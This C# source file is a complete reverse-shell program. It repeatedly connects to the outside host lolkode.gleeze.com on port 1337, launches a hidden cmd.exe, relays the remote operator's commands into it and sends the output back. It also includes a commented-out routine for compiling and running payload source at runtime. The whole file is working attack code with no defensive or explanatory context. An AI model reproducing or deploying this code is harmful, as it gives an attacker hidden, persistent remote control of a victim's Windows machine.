using System;
using System.Text;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;

namespace Rev3Rs3
{
    class Program
    {
        static string ip = "lolkode.gleeze.com";
        static int port = 1337;
        static int delay = Convert.ToInt32("5000");
        static StreamWriter streamWriter;
        static void Main(string[] args)
        {
            while(true)
            {
                CreateShell();
                System.Threading.Thread.Sleep(delay);
            }
        }
        static void CreateShell()
        {
            try
            {
                using (TcpClient _socket = new TcpClient(ip, port))
                {
                    using (Stream stream = _socket.GetStream())
                    {
                        using (StreamReader _reader = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);
                            StringBuilder strInput = new StringBuilder();
                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();
                            while (_socket.Connected)
                            {
                                strInput.Append(_reader.ReadLine());
                                //strInput.Append("\n");
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                            System.Threading.Thread.Sleep(5000);
                            Main(null);
                        }
                    }
                }
            }
            catch { }
        }
        
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder _HOut = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    _HOut.Append(outLine.Data);
                    streamWriter.WriteLine(_HOut);
                    streamWriter.Flush();
                }
                catch { }
            }
        }
        /*
        private bool CompilePayload(string SourceCode,string NameSpaceDotClass,string EntryMethodName,object[] _params)
        {
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerResults results = provider.CompileAssemblyFromSource(new System.CodeDom.Compiler.CompilerParameters(), SourceCode);
            if (results.Errors.Count > 0)
            {
                return false;
            }
            results.CompiledAssembly.GetType(NameSpaceDotClass).GetMethod(EntryMethodName).Invoke(null, _params);
            return true;
        }
        */
    }
}
